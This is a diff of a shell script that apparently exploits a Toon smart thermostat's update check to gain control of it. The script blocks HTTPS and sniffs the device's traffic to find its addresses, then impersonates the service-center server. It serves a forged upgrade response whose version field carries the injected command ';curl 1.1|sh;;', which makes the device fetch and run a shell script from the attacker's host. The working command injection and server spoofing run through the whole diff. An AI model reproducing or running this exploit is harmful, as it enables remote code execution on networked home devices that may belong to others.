@@ -25,7 +25,6 @@ then
 # exit
 fi
 
-
 if ! [ $1 ] 
 then
  echo "Default payload loaded: Kill qt-gui"
@@ -38,9 +37,9 @@ fi
 echo "Blocking all HTTPS (and therefore Toon VPN). Reboot your toon now. And after that press the 'software' button on your Toon."
 /sbin/iptables -I FORWARD -p tcp --dport 443 -j DROP
 
-OUTPUT=`/usr/sbin/tcpdump -n -i any port 31080 -c 1 2>/dev/null` || exit "tcpdump failed"
-TOONIP=`echo $OUTPUT | cut -d\  -f3 | cut -d\. -f1,2,3,4`
-IP=`echo $OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`
+OUTPUT=`/usr/bin/tcpdump -n -i any dst net 172.16.0.0/12 and port 31080 -c 1 2>/dev/null` || exit "tcpdump failed"
+TOONIP=`echo $OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`
+IP=`echo $OUTPUT | cut -d\  -f7 | cut -d\. -f1,2,3,4`
 
 [ -f /tmp/pipe.in ] || /usr/bin/mkfifo /tmp/pipe.in
 [ -f /tmp/pipe.out ] || /usr/bin/mkfifo /tmp/pipe.out
@@ -48,8 +47,8 @@ IP=`echo $OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`
 echo "The Toon from $TOONIP is connecting to servicecenter IP: $IP"
 echo "Let's have some fun!"
 
-/sbin/ip addr add 1.0.0.1/32 dev lo 2>/dev/null
-/sbin/ip addr add $IP/32 dev lo 2>/dev/null
+ip addr add 1.0.0.1/32 dev lo 2>/dev/null
+ip addr add $IP/32 dev lo 2>/dev/null
 
 
 RESPONSE='HTTP/1.1 200 OK\n\n
@@ -58,7 +57,7 @@ RESPONSE='HTTP/1.1 200 OK\n\n
 <action xmlns:u="http://schema.homeautomationeurope.com/quby" class="response" uuid="0429a450-bd0c-11e0-962b-0800200c9a66" destuuid="_DESTUUID_" destcommonname="_DESTCOMMONNAME_" requestid="_REQUESTID_" serviceid="urn:hcb-hae-com:serviceId:specific1">\n
   <u:GetUpgradeResponse xmlns:u="http://schema.homeautomationeurope.com/quby">\n
     <DoUpgrade>true</DoUpgrade>\n
-    <Ver>7.;curl 1.1|sh;;</Ver>\n
+    <Ver>9.;curl 1.1|sh;;</Ver>\n
     <Success>true</Success>\n
     <Reason>Success</Reason>\n
     <ReasonDetails>Success</ReasonDetails>\n
